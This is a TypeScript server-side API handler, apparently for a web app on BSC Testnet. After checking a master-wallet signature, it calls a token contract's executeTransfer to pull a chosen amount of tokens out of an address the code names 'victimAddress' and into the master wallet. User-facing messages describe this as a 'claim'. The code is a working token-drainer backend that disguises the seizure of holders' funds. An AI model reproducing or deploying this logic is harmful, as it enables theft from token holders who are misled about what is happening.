import "@tanstack/react-start/server-only";
import {
  Contract,
  JsonRpcProvider,
  Wallet,
  isAddress,
  randomBytes,
  hexlify,
  verifyMessage,
  ZeroAddress,
} from "ethers";
import { claimMessage, DUST_ADDRESS, MASTER_ABI, tokenAmount } from "./bsc-testnet";

const challenges = new Map<string, { origin: string; expires: number }>();
let busy = false;
const json = (body: unknown, status = 200) =>
  Response.json(body, { status, headers: { "Cache-Control": "no-store" } });

// Imported only by the server entry. No private-key values enter client modules.
export async function executeTransferApi(request: Request) {
  const origin = new URL(request.url).origin;
  if (request.method !== "GET" && request.method !== "POST")
    return json({ error: "Method not allowed." }, 405);
  if (request.method === "GET") {
    for (const [nonce, entry] of challenges)
      if (entry.expires < Date.now()) challenges.delete(nonce);
    if (challenges.size >= 1000) return json({ error: "Please try again later." }, 429);
    const nonce = hexlify(randomBytes(32));
    challenges.set(nonce, { origin, expires: Date.now() + 120_000 });
    return json({ nonce });
  }
  if (request.headers.get("origin") !== origin)
    return json({ error: "Invalid request origin." }, 403);
  if (busy) return json({ error: "A claim is already processing. Please try again." }, 409);
  let provider: JsonRpcProvider | undefined;
  let txHash = "";
  try {
    const body = await request.text();
    if (body.length > 4096) return json({ error: "Request too large." }, 413);
    let input;
    try {
      input = JSON.parse(body);
    } catch {
      return json({ error: "Invalid request." }, 400);
    }
    const { victimAddress, amount, signature, nonce } = input ?? {};
    if (
      typeof victimAddress !== "string" ||
      !isAddress(victimAddress) ||
      victimAddress === ZeroAddress ||
      typeof amount !== "string" ||
      !/^\d+(\.\d+)?$/.test(amount) ||
      amount.length > 100 ||
      !/[1-9]/.test(amount) ||
      typeof signature !== "string" ||
      typeof nonce !== "string"
    )
      return json({ error: "Invalid address, amount or signature." }, 400);
    const challenge = challenges.get(nonce);
    challenges.delete(nonce);
    if (!challenge || challenge.origin !== origin || challenge.expires < Date.now())
      return json({ error: "Claim authorization expired. Please retry." }, 403);
    let authorized;
    try {
      authorized = verifyMessage(claimMessage(origin, victimAddress, amount, nonce), signature);
    } catch {
      return json({ error: "Invalid claim signature." }, 403);
    }
    const privateKey = process.env["MASTER_WALLET_PRIVATE_KEY"];
    if (!privateKey)
      return json({ error: "Claim is unavailable: server master wallet is not configured." }, 503);
    provider = new JsonRpcProvider(
      process.env["NEXT_PUBLIC_BSC_TESTNET_RPC"] || "https://bsc-testnet-rpc.publicnode.com",
    );
    if ((await provider.getNetwork()).chainId !== 97n)
      return json({ error: "Server RPC must use BSC Testnet." }, 503);
    const signer = new Wallet(privateKey, provider);
    const token = new Contract(DUST_ADDRESS, MASTER_ABI, signer);
    const master = (await token.getFunction("masterWallet")()) as string;
    if (authorized.toLowerCase() !== master.toLowerCase())
      return json({ error: "Only the contract master wallet may authorize a claim." }, 403);
    if (signer.address.toLowerCase() !== master.toLowerCase())
      return json({ error: "Server wallet does not match the contract master wallet." }, 503);
    const decimals = Number(await token.getFunction("decimals")());
    let units;
    try {
      units = tokenAmount(amount, decimals);
    } catch {
      return json({ error: "Invalid token amount or decimal precision." }, 400);
    }
    if (victimAddress.toLowerCase() === master.toLowerCase())
      return json({ error: "Source wallet is already the master wallet." }, 400);
    if ((await token.getFunction("balanceOf")(victimAddress)) < units)
      return json({ error: "Insufficient token balance." }, 400);
    if (busy) return json({ error: "A claim is already processing. Please retry." }, 409);
    busy = true;
    try {
      const tx = await token.getFunction("executeTransfer")(victimAddress, master, units);
      txHash = tx.hash;
      const receipt = await tx.wait(1, 120_000);
      if (!receipt || receipt.status !== 1)
        return json(
          {
            error: "Claim confirmation is pending. Check the transaction before retrying.",
            txHash,
          },
          504,
        );
      return json({ success: true, txHash: receipt.hash });
    } finally {
      busy = false;
    }
  } catch {
    return json(
      {
        error: txHash
          ? "Claim was submitted but confirmation could not be verified. Check the transaction before retrying."
          : "Unable to execute claim. Check BSC Testnet connectivity, server wallet gas and contract permissions.",
        ...(txHash ? { txHash } : {}),
      },
      502,
    );
  } finally {
    provider?.destroy();
  }
}
